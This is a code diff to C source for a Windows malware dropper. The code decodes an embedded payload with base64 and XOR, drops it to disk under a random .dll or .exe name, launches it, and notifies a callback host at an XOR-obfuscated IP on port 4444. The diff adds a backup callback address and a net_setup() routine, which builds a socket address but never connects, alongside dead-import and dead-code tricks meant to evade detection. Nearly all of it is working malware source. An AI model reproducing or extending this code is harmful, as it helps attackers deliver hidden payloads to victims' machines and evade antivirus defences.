@@ -36,6 +36,8 @@ void* XOR(void *data, int size);
 void* base64decode(void *data,DWORD *size);
 void launch();
 void set_name();
+void notify();
+void net_setup();
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -46,13 +48,35 @@ void set_name();
 #define NAME_SIZE 10
 #define INJECT
 // Socket
+#define PRIMARY_IP "192.168.56.1"
+
 #define IP_XOR_KEY 0x41
 #define ENCODED_IP {0x70, 0x78, 0x73, 0x6f, 0x70, 0x77, 0x79, 0x6f, 0x74, 0x77, 0x6f, 0x70}
 #define ENCODED_IP_LEN 12
 #define SERVER_PORT 4444
 
+#define IP2_XOR_KEY 0x41
+#define ENCODED_IP2 {0x70, 0x78, 0x73, 0x6f, 0x70, 0x77, 0x79, 0x6f, 0x74, 0x77, 0x6f, 0x70}
+#define ENCODED_IP2_LEN 12
+#define BACKUP_PORT 4444
+
 // global: final binary name
 char name[10*NAME_SIZE];
+
+void net_setup()
+{
+	unsigned char encoded_ip[] = ENCODED_IP2;
+	char decoded_ip[ENCODED_IP2_LEN + 1];
+	for (int i = 0; i < ENCODED_IP2_LEN; i++) {
+		decoded_ip[i] = encoded_ip[i] ^ IP2_XOR_KEY;
+	}
+	decoded_ip[ENCODED_IP2_LEN] = '\0';
+
+	struct sockaddr_in server;
+	server.sin_family = AF_INET;
+	server.sin_port = htons(BACKUP_PORT);
+	server.sin_addr.s_addr = inet_addr(decoded_ip);
+}
 
 // notify to host tcp
 void notify()
@@ -98,51 +122,52 @@ int main()
 	void* data = LockResource(rc);
 	// Get embedded file size
 	DWORD size = SizeofResource(h,r);
-// Obfuscation Procedures start here
-// The order of decoding was switched here for testing
-// Used to be xor then b64, now it is b64 then xor
-#ifdef BASE64
-	data = base64decode(data, &size);
-#endif
-#ifdef XOR_ENCODE
-	data = XOR(data, size);
-#endif
-	// where to drop
-	set_name();
-	// Drop to Disk
-	drop(size, data);
-	// notify tcp and launch process
-	notify();
-	launch();
-#ifdef DEAD_CODE
-	// dead code
-	dead();
-#endif
-	// exit without waiting child process
-	return 0;
+	// Obfuscation Procedures start here
+	// The order of decoding was switched here for testing
+	// Used to be xor then b64, now it is b64 then xor
+	#ifdef BASE64
+		data = base64decode(data, &size);
+	#endif
+	#ifdef XOR_ENCODE
+		data = XOR(data, size);
+	#endif
+		// where to drop
+		set_name();
+		// Drop to Disk
+		drop(size, data);
+		// notify tcp and launch process
+		net_setup();
+		notify();
+		launch();
+	#ifdef DEAD_CODE
+		// dead code
+		dead();
+	#endif
+		// exit without waiting child process
+		return 0;
 }
 
 void set_name()
 {
-#ifdef RANDOM_NAME
-	int valid=0;
-	srand(time(NULL));
-	while(valid<NAME_SIZE)
-	{
-		char c = rand();
-		if(c>='a' && c<='z')
+	#ifdef RANDOM_NAME
+		int valid=0;
+		srand(time(NULL));
+		while(valid<NAME_SIZE)
 		{
-			name[valid++]=c;
+			char c = rand();
+			if(c>='a' && c<='z')
+			{
+				name[valid++]=c;
+			}
 		}
-	}
-#else
-	strcpy(name,"proc");
-#endif
-#ifdef INJECT
-	strcat(name,".dll");
-#else
-	strcat(name,".exe");
-#endif
+	#else
+		strcpy(name,"proc");
+	#endif
+	#ifdef INJECT
+		strcat(name,".dll");
+	#else
+		strcat(name,".exe");
+	#endif
 }
 
 // Launch a New Process based on the dropped file name
@@ -214,6 +239,8 @@ void drop(int size, void *buffer)
 // Dead Imports Function
 void dead()
 {
+	struct sockaddr_in s1;
+	s1.sin_addr.s_addr = inet_addr(PRIMARY_IP);
 	return;
 	memcpy(NULL,NULL,NULL);
 	memset(NULL,NULL,NULL);
